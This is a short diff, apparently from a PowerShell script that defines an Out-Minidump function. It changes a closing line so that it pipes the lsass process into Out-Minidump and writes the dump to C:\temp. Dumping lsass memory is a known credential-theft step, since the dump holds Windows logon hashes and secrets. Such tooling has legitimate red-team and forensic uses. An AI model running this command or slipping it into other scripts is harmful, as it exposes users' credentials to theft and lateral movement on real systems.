@@ -129,4 +129,5 @@ function Out-Minidump
     END {}
 }
 
-Get-Process lsass| Out-Minidump
+Get-Process lsass| Out-Minidump -DumpFilePath C:\temp
+
